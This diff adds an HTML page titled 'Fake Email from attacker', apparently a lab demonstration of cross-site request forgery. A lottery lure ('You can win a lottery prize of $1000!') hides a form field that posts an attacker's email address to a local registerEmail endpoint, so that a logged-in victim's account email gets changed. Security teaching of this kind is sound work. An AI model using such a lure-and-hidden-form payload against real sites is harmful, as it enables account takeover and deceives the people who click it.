@@ -1,0 +1,17 @@
+<!DOCTYPE html>
+<html lang="en" xmlns:th="https://www.thymeleaf.org">
+<head>
+  <meta charset="UTF-8">
+  <title>Fake Email from attacker</title>
+</head>
+<body>
+    <h1>You can win a lottery prize of $1000!</h1>
+    <form method="post" action="http://localhost:8090/registerEmail">
+        <p>
+            Please click here to register.
+        </p>
+        <input type="hidden" name="newEmail" value="fake.attacker@gmail.com"/>
+        <button type="submit">Register</button>
+    </form>
+</body>
+</html>
